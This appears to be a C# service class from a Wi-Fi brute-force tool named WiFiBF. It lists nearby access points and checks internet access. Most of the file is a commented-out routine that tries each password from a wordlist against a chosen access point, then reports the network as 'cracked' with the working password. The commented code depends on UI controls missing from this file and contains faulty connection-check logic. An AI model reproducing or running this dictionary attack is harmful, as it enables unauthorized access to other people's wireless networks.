using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WiFiBF.Service.Interface;
using SimpleWifi;
using NativeWifi;
using System.Net;

namespace WiFiBF.Service
{
    /// <summary>
    /// WifiService class
    /// </summary>
    public class WifiService : IWifiService
    {
        private Wifi wifi;
        private WlanClient wlan;

        /// <summary>
        /// Constructor
        /// </summary>
        public WifiService()
        {
            wifi = new Wifi();
            wlan = new WlanClient();
        }

        /// <summary>
        /// Get list of access points in range
        /// </summary>
        public List<AccessPoint> GetAvailableAccessPoints()
        {
            return wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength).ToList();
        }

        /// <summary>
        /// Check if internet can be accessed
        /// </summary>
        public bool IsConnectionToInternetAvailable()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        //private void crack(AccessPoint selectedAP)
        //{
        //    if (passwords.Count == 0)
        //    {
        //        MessageBox.Show("Please Select a Wordlist");
        //        return;
        //    }
        //    int count = 1;
        //    foreach (string pass in passwords)
        //    {
        //        SetControlPropertyThreadSafe(label3, "Text", "Status: Trying Password: " + pass + " (" + count + " / " + passwords.Count + ")"); count++;
        //        // Auth
        //        AuthRequest authRequest = new AuthRequest(selectedAP);
        //        bool overwrite = true;

        //        if (authRequest.IsPasswordRequired)
        //        {
        //            if (overwrite)
        //            {
        //                if (authRequest.IsUsernameRequired)
        //                {
        //                    Console.Write("\r\nPlease enter a username: ");
        //                    authRequest.Username = Console.ReadLine();
        //                }
        //                authRequest.Password = pass;

        //                if (authRequest.IsDomainSupported)
        //                {
        //                    Console.Write("\r\nPlease enter a domain: ");
        //                    authRequest.Domain = Console.ReadLine();
        //                }
        //            }
        //        }

        //        selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
        //        int i = Convert.ToInt32(textBox1.Text);
        //        Thread.Sleep(i * 1000);
        //        if (check(selectedAP) == true && CheckForInternetConnection() == true)
        //        {
        //            SetControlPropertyThreadSafe(label3, "Text", "Status: Successfully Cracked: " + selectedAP.Name + " With Password: " + pass);
        //            return;
        //        }
        //    }
        //}

        //private bool check(AccessPoint selectedAP)
        //{
        //    Collection<String> connectedSsids = new Collection<string>();
        //    if (WifiStatus.Connected.ToString() == "Connected")
        //    {
        //        foreach (NativeWifi.WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
        //        {
        //            try
        //            {
        //                Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
        //                connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
        //            }
        //            catch (Exception)
        //            {
        //                return false;
        //            }
        //        }
        //        foreach (string ssid in connectedSsids)
        //        {
        //            if (selectedAP.Name == ssid)
        //            {
        //                return true;
        //            }
        //            else
        //            {
        //                return false;
        //            }
        //        }
        //    }
        //    return false;
        //}

    }
}
